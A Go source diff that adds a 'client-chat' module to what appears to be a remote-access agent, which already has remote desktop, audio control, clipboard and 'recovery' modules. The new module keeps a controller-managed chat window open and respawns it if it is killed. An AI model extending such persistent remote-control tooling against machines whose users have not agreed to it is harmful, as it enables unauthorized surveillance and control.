@@ -13,6 +13,7 @@ import (
 	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
+	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
 	"github.com/rootbay/tenvy-client/internal/protocol"
@@ -66,6 +67,7 @@ func newDefaultModuleRegistry() *moduleRegistry {
 	registry.register(&remoteDesktopModule{})
 	registry.register(&audioModule{})
 	registry.register(&clipboardModule{})
+	registry.register(&clientChatModule{})
 	registry.register(&recoveryModule{})
 	registry.register(&systemInfoModule{})
 	return registry
@@ -400,6 +402,64 @@ func (m *recoveryModule) HandleCommand(ctx context.Context, cmd protocol.Command
 func (m *recoveryModule) Shutdown(context.Context) {
 	if m.manager != nil {
 		m.manager.Shutdown()
+	}
+}
+
+type clientChatModule struct {
+	supervisor *clientchat.Supervisor
+}
+
+func (m *clientChatModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "client-chat",
+		Title:       "Client Chat",
+		Description: "Maintain a persistent, controller-managed chat window on the client.",
+		Commands:    []string{"client-chat"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "client-chat.persist",
+				Description: "Respawn the client chat interface if the process terminates unexpectedly.",
+			},
+			{
+				Name:        "client-chat.alias",
+				Description: "Apply controller-provided aliases for both participants in real time.",
+			},
+		},
+	}
+}
+
+func (m *clientChatModule) Update(runtime moduleRuntime) error {
+	cfg := clientchat.Config{
+		AgentID:   runtime.AgentID,
+		BaseURL:   runtime.BaseURL,
+		AuthKey:   runtime.AuthKey,
+		Client:    runtime.HTTPClient,
+		Logger:    runtime.Logger,
+		UserAgent: runtime.UserAgent,
+	}
+	if m.supervisor == nil {
+		m.supervisor = clientchat.NewSupervisor(cfg)
+		return nil
+	}
+	m.supervisor.UpdateConfig(cfg)
+	return nil
+}
+
+func (m *clientChatModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+	if m.supervisor == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "client chat subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+	return m.supervisor.HandleCommand(ctx, cmd)
+}
+
+func (m *clientChatModule) Shutdown(ctx context.Context) {
+	if m.supervisor != nil {
+		m.supervisor.Shutdown(ctx)
 	}
 }
 
